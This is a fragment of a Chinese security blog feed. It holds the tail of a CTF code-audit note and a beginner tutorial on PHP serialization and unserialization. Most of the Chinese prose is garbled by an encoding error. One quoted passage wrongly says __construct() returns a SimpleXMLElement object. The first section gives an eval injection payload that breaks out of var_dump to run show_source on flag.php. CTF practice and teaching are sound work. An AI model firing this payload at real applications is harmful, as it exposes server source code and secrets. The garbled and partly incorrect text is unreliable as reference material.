<pre><code>?hello=1);show_source(%27flag.php%27);var_dump(3</code></pre><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278kv4j30o808hdgc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278kv4j30o808hdgc.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="æ³¨å…¥ç†è§£"><a href="#æ³¨å…¥ç†è§£" class="headerlink" title="æ³¨å…¥ç†è§£"></a>æ³¨å…¥ç†è§£</h3><p>file()å‡½æ•°çš„ä½œç”¨æ˜¯è¯»å–æ–‡ä»¶ï¼Œç„¶åä»¥æ•°ç»„çš„å½¢å¼è¿”å›<br>evalå‡½æ•°ä¸­ï¼Œ <code>&quot; &quot;</code> å†…éƒ¨ä¸ºä»£ç ï¼Œ <code>//</code> åªåœ¨ä»£ç ä¸­èµ·ä½œç”¨ï¼Œç›¸å½“äºåªæ³¨é‡Šäº†<code>)</code>ï¼›<br>ç„¶åæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ <code>file_get_contents</code> ä¸ <code>file</code> åŠ <code>var_dump</code>ï¼Œ<code>print_r</code> å’Œ <code>echo</code> </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55a4jyj30ao043mx9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55a4jyj30ao043mx9.jpg" class="lazyload" title="test"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55abpfj30bq05v0t5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55abpfj30bq05v0t5.jpg" class="lazyload" title="test"></a></p>
<p>è¿”å›å€¼å¦‚ä¸‹</p>
<pre><code>Array ( [0] =&gt; icnlude &quot;flag.php&quot;; [2] =&gt; $a = @$_Request[&apos;hello&apos;]; [3] =&gt; eval(&quot;var_dump($a);&quot;); [4] =&gt; show_source(__file__); [5] =&gt; ?&gt; )</code></pre><p>åé¢çš„å‘å†æ·»å§</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆPHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–</title>
    <url>/yakko117/2019/03/03/%E6%B5%85%E8%B0%88PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è‡ªå·±æŒ–çš„å‘ï¼Œå“­ç€ä¹Ÿè¦å¡«å®Œ<br>(ps:å‚è€ƒäº†æ— æ•°å¤§ä½¬çš„æ–‡ç«  åšäº†ä¸ªå½’çº³æ€»ç»“ï¼Œåé¢ä¹Ÿä¼šæ…¢æ…¢æŠŠè‡ªå·±çš„ç§¯ç´¯è®°å½•ä¸‹æ¥)</p>
<hr>
<h1 id="serializeï¼šåºåˆ—åŒ–"><a href="#serializeï¼šåºåˆ—åŒ–" class="headerlink" title="serializeï¼šåºåˆ—åŒ–"></a>serializeï¼šåºåˆ—åŒ–</h1><h2 id="åºåˆ—åŒ–æ ¼å¼"><a href="#åºåˆ—åŒ–æ ¼å¼" class="headerlink" title="åºåˆ—åŒ–æ ¼å¼"></a>åºåˆ—åŒ–æ ¼å¼</h2><p>åœ¨PHPä¸­ï¼Œåºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚<br>åºåˆ—åŒ–å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string serialize ( mixed $value )</span><br></pre></td></tr></table></figure></div>

<p>å¥—ç”¨æ‚ æ‚ å¤§ä½¬çš„ä¸€ä¸ªæ —å­</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $pass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data, $pass)</span> //åˆ›é€ ä¸€ä¸ªè¿”å›è¡¨ç¤ºæ•°æ®çš„å¯¹è±¡</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = <span class="number">16</span>;</span><br><span class="line">$str = <span class="string">'Manayakko'</span>;</span><br><span class="line">$bool = <span class="keyword">true</span>;</span><br><span class="line">$null = <span class="keyword">NULL</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">$aa = <span class="keyword">new</span> Mana(<span class="string">'yakko'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($number));</span><br><span class="line">var_dump(serialize($str));</span><br><span class="line">var_dump(serialize($bool));</span><br><span class="line">var_dump(serialize($null));</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">var_dump(serialize($aa));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p> <code>__construct()</code> å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ SimpleXMLElement å¯¹è±¡ã€‚<br>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚<br>è¿”å›å€¼ï¼šè¿”å›ä¸€ä¸ªè¡¨ç¤ºæ•°æ®çš„ SimpleXMLElement å¯¹è±¡ã€‚</p>
</blockquote>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0pry62ox6j30l606zgmy.jpg" data-fancybox="group" data-caption="2php" class="fancybox"><img alt="2php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0pry62ox6j30l606zgmy.jpg" class="lazyload" title="2php"></a></p>
<hr>
<h2 id="æ‰€ä»¥åºåˆ—åŒ–å¯¹äºä¸åŒç±»å‹å¾—åˆ°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š"><a href="#æ‰€ä»¥åºåˆ—åŒ–å¯¹äºä¸åŒç±»å‹å¾—åˆ°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š" class="headerlink" title="æ‰€ä»¥åºåˆ—åŒ–å¯¹äºä¸åŒç±»å‹å¾—åˆ°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š"></a>æ‰€ä»¥åºåˆ—åŒ–å¯¹äºä¸åŒç±»å‹å¾—åˆ°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š</h2><ul>
<li><code>String</code> : s:size:value;</li>
<li><code>Integer</code> : i:value;</li>
<li><code>Boolean</code> : b:value;(ä¿å­˜1æˆ–0)</li>
<li><code>Null</code> : N;</li>
<li><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</li>
<li><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} </li>
</ul>
<hr>
<p>ä¸€å¼€å§‹ä¸èƒ½ç†è§£ï¼Œæ²¡å…³ç³»ï¼Œç®€å•è§£é‡Š</p>
<pre><code>serialize æŠŠä¸€ä¸ªå¯¹è±¡è½¬æˆå­—ç¬¦ä¸²å½¢å¼ï¼Œ å¯ä»¥ç”¨äºä¿å­˜</code></pre><hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'a.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> F();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;filename.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure></div>
<p>ä¸Šé¢æ —å­æ˜¯åˆ›å»ºä¸€ä¸ªç±»ï¼Œå¹¶è¾“å‡ºfilenameçš„å€¼ï¼Œæœ€åè¾“å‡ºåºåˆ—åŒ–å­—ç¬¦ä¸²:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry60xb6j30cn04saa8.jpg" data-fancybox="group" data-caption="2php" class="fancybox"><img alt="2php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry60xb6j30cn04saa8.jpg" class="lazyload" title="2php"></a></p>
<p>å…³äºè¿™ä¸€ä¸²ï¼š</p>
<blockquote>
<p>O:1:â€Fâ€:1:{s:8:â€filenameâ€;s:5:â€a.txtâ€;}</p>
</blockquote>
<p>ç®€å•è§£é‡Šï¼š<br>O : å¯¹è±¡ï¼Œ 1 å¯¹è±¡åé•¿åº¦ ï¼ˆå°±æ˜¯ <code>F</code> ï¼‰<br>S ï¼šå­—ç¬¦ä¸²ï¼Œ 8 å°±æ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼Œ<code>fliename</code> ä¸ºå­—ç¬¦ä¸²å®šä¹‰æ—¶çš„åå­—ï¼ˆåé¢çš„åŒç†ï¼‰<br>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»£ç é‡Œçš„ç±»å®šä¹‰ä¸º: <code>class F</code>ï¼Œè¿™ä¸ªåºåˆ—åŒ–å°±æ˜¯ Fï¼Œæˆ‘å®šä¹‰å˜é‡åå­—æ˜¯filenameï¼Œå®ƒè¿™é‡Œä¹Ÿæ˜¯ filename, æˆ‘ä»¬å¯ä»¥ä¿®æ”¹çœ‹çœ‹:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry62qj3j30qk0c10u2.jpg" data-fancybox="group" data-caption="2_1php" class="fancybox"><img alt="2_1php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry62qj3j30qk0c10u2.jpg" class="lazyload" title="2_1php"></a></p>
<p>å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–åçš„å˜é‡åå­—å˜æˆ <code>filenameF</code> äº†ã€‚</p>
<hr>
<h2 id="åºåˆ—åŒ–å¯¹è±¡"><a href="#åºåˆ—åŒ–å¯¹è±¡" class="headerlink" title="åºåˆ—åŒ–å¯¹è±¡"></a>åºåˆ—åŒ–å¯¹è±¡</h2><p>ä»ä¸Šé¢çš„ä¾‹å­ä¸­å¯ä»¥çœ‹å‡º<strong>åºåˆ—åŒ–å¯¹è±¡åªä¼šä¿å­˜å±æ€§å€¼</strong>ã€‚</p>
<ul>
<li>é‚£ä¹ˆå¯¹è±¡ä¸­çš„å¸¸é‡æ˜¯å¦ä¼šä¿å­˜ï¼Ÿ</li>
<li>ç»§æ‰¿æ—¶ï¼Œçˆ¶ç±»çš„å˜é‡æ˜¯å¦ä¼šä¿å­˜ï¼Ÿ</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xiaohei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $xh_data = <span class="string">'xh'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mana</span> <span class="keyword">extends</span> <span class="title">Xiaohei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $pass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data, $pass)</span>  //åˆ›å»ºä¸€ä¸ªè¿”å›æ•°æ®çš„å¯¹è±¡</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPass</span><span class="params">($pass)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cc = <span class="keyword">new</span> Mana(<span class="string">'yakko'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($cc));</span><br></pre></td></tr></table></figure></div>
<p>è¿”å›å€¼å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(83) &quot;O:4:&quot;Mana&quot;:3:&#123;s:4:&quot;data&quot;;s:5:&quot;yakko&quot;;s:10:&quot; Mana pass&quot;;b:1;s:7:&quot;xh_data&quot;;s:2:&quot;xh&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<p>åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¸ä¼šä¿å­˜å¸¸é‡çš„å€¼ã€‚å¯¹äºçˆ¶ç±»ä¸­çš„å˜é‡ï¼Œåˆ™ä¼šä¿ç•™ã€‚</p>
<hr>
<h2 id="åºåˆ—åŒ–å¯¹è±¡è‡ªå®šä¹‰"><a href="#åºåˆ—åŒ–å¯¹è±¡è‡ªå®šä¹‰" class="headerlink" title="åºåˆ—åŒ–å¯¹è±¡è‡ªå®šä¹‰"></a>åºåˆ—åŒ–å¯¹è±¡è‡ªå®šä¹‰</h2><p>åœ¨åºåˆ—åŒ– <strong>å¯¹è±¡</strong> çš„æ—¶å€™ï¼Œå¯¹äº <strong>å¯¹è±¡</strong> çš„ä¸€äº›æ•æ„Ÿå±æ€§ï¼Œæˆ‘ä»¬ä¸éœ€ä¿å­˜ï¼Œä½†åº”è¯¥å¦‚ä½•å¤„ç†ï¼Ÿ<br>å½“è°ƒç”¨ <code>serialize()</code> å‡½æ•°åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ï¼Œå¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚<br>å¯ä»¥é€šè¿‡é‡è½½è¿™ä¸ªæ–¹æ³•ï¼Œä»è€Œè‡ªå®šä¹‰åºåˆ—åŒ–è¡Œä¸ºã€‚è¯¥æ–¹æ³•åŸå‹å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public array __sleep ( void )</span><br></pre></td></tr></table></figure></div>

<ul>
<li>è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„</li>
<li>è¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯</li>
<li><code>__sleep()</code> ä¸èƒ½è¿”å›çˆ¶ç±»çš„ç§æœ‰æˆå‘˜çš„åå­—ã€‚è¿™æ ·åšä¼šäº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯ã€‚è¿™æ—¶åªèƒ½ç”¨ <code>Serializable</code> æ¥å£æ¥æ›¿ä»£ã€‚</li>
<li>å¸¸ç”¨äºä¿å­˜é‚£äº›å¤§å¯¹è±¡æ—¶çš„æ¸…ç†å·¥ä½œï¼Œé¿å…ä¿å­˜è¿‡å¤šå†—ä½™æ•°æ®</li>
</ul>
<p>çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> SITE = <span class="string">'yakko'</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> $username;</span><br><span class="line">        <span class="keyword">public</span> $another;</span><br><span class="line">        <span class="keyword">private</span> $password;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $another, $password)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;another = $another;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// é‡è½½åºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// è¿”å›éœ€è¦åºåˆ—åŒ–çš„å˜é‡åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'username'</span>, <span class="string">'another'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $user = <span class="keyword">new</span> User(<span class="string">'manayakko'</span>, <span class="string">'yakko'</span>, <span class="string">'123456'</span>);</span><br><span class="line">    var_dump(serialize($user));</span><br></pre></td></tr></table></figure></div>
<p>è¿”å›ç»“æœå¦‚ä¸‹ï¼Œæ˜¾ç„¶åºåˆ—åŒ–çš„æ—¶å€™å¿½ç•¥äº† password å­—æ®µçš„å€¼ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(72) &quot;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;manayakko&quot;;s:7:&quot;another&quot;;s:5:&quot;yakko&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="åºåˆ—åŒ–å¯¹è±¡å­˜å‚¨"><a href="#åºåˆ—åŒ–å¯¹è±¡å­˜å‚¨" class="headerlink" title="åºåˆ—åŒ–å¯¹è±¡å­˜å‚¨"></a>åºåˆ—åŒ–å¯¹è±¡å­˜å‚¨</h2><p>é€šè¿‡ä¸Šé¢çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªå¤åˆ¶çš„å¯¹è±¡æˆ–è€…æ•°æ®åºåˆ—åŒ–æˆä¸€ä¸ªåºåˆ—å­—ç¬¦ä¸²ï¼Œä¿å­˜å€¼çš„åŒäº‹è¿˜ä¿å­˜äº†ä»–ä»¬çš„ç»“æ„ã€‚<br>æˆ‘ä»¬å¯ä»¥æŠŠåºåˆ—åŒ–ä¹‹åçš„å€¼ä¿å­˜èµ·æ¥ï¼Œå­˜åœ¨æ–‡ä»¶æˆ–è€…ç¼“å­˜é‡Œé¢ã€‚ä¸æ¨èå­˜åœ¨æ•°æ®åº“é‡Œé¢ï¼Œå¯è¯»æ€§æŸ¥ï¼Œè€Œä¸”ä¸ä¾¿äºè¿ç§»ç»´æŠ¤ï¼Œä¸ä¾¿äºæŸ¥è¯¢ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $user = <span class="keyword">new</span> User(<span class="string">'manayakko'</span>, <span class="string">'yakko'</span>, <span class="string">'123456'</span>);</span><br><span class="line">    $ser = serialize($user);</span><br><span class="line">    <span class="comment">// ä¿å­˜åœ¨æœ¬åœ°</span></span><br><span class="line">    file_put_contents(<span class="string">'user.ser'</span>, $ser);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="unserializeï¼šååºåˆ—åŒ–"><a href="#unserializeï¼šååºåˆ—åŒ–" class="headerlink" title="unserializeï¼šååºåˆ—åŒ–"></a>unserializeï¼šååºåˆ—åŒ–</h1><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>é€šè¿‡ä¸Šé¢çš„è®²è§£ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²å¹¶ä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆå¦‚ä½•æŠŠè¿™äº›åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ¢å¤æˆåŸæ ·å‘¢ï¼ŸPHPæä¾›äº†ååºåˆ—å‡½æ•°ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed unserialize ( string $str )</span><br></pre></td></tr></table></figure></div>
<p> <code>unserialize()</code> ååºåˆ—åŒ–å‡½æ•°ç”¨äºå°†å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è½¬æ¢å› PHP çš„å€¼ã€‚</p>
<ul>
<li>å¦‚æœä¼ é€’çš„å­—ç¬¦ä¸²ä¸å¯è§£åºåˆ—åŒ–ï¼Œåˆ™è¿”å› <code>FALSE</code>ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code></li>
<li>è¿”å›çš„æ˜¯è½¬æ¢ä¹‹åçš„å€¼ï¼Œå¯ä¸º <code>integer</code>ã€<code>float</code>ã€<code>string</code>ã€<code>array</code> æˆ– <code>object</code></li>
<li>è‹¥è¢«ååºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸé‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHPä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨<code>__wakeup()</code>æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ </li>
</ul>
<p>çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $another;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $another, $password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username; <span class="comment">//ç±»ä¸­å®šä¹‰çš„å±€éƒ¨å˜é‡</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;another = $another;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ååºåˆ—åŒ–åè°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$xiaohei = <span class="string">'O:4:"User":2:&#123;s:8:"username";s:9:"manayakko";s:7:"another";s:5:"yakko";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($xiaohei));<span class="keyword">echo</span><span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Arr = <span class="keyword">array</span>(<span class="string">'xiaohei'</span>,<span class="string">'goza'</span>,<span class="string">'yakko'</span>);</span><br><span class="line">$new = serialize($Arr);</span><br><span class="line">print_r($new);<span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">print_r(unserialize($new));</span><br></pre></td></tr></table></figure></div>
<p>è¾“å‡ºç»“æœä¸ºï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">object(User)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">"username"</span>]=&gt;string(<span class="number">9</span>) <span class="string">"manayakko"</span></span><br><span class="line">  [<span class="string">"another"</span>]=&gt;string(<span class="number">5</span>) <span class="string">"yakko"</span></span><br><span class="line">  [<span class="string">"password:private"</span>]=&gt;string(<span class="number">9</span>) <span class="string">"manayakko"</span></span><br><span class="line">  [<span class="string">"order:private"</span>]=&gt;<span class="keyword">NULL</span> &#125;</span><br><span class="line">  </span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">"xiaohei"</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"goza"</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">"yakko"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; xiaohei</span><br><span class="line">        [<span class="number">1</span>] =&gt; goza</span><br><span class="line">        [<span class="number">2</span>] =&gt; yakko )</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š</p>
<ul>
<li><code>__wakeup()</code> å‡½æ•°åœ¨å¯¹è±¡è¢«æ„å»ºä»¥åæ‰§è¡Œï¼Œæ‰€ä»¥$this-&gt;usernameçš„å€¼ä¸ä¸ºç©º</li>
<li>åœ¨è°ƒç”¨ <code>__wakeUp()</code> æ–¹æ³•ï¼Œå¯¹è±¡ä¼šå»ºç«‹åœ¨åºåˆ—åŒ–æ—¶æœªèƒ½ä¿ç•™çš„å„ç§çŠ¶æ€ã€‚</li>
<li>ååºåˆ—åŒ–æ—¶ï¼Œä¼šå°½é‡å°†å˜é‡å€¼è¿›è¡ŒåŒ¹é…å¹¶å¤åˆ¶ç»™åºåˆ—åŒ–åçš„å¯¹è±¡</li>
</ul>
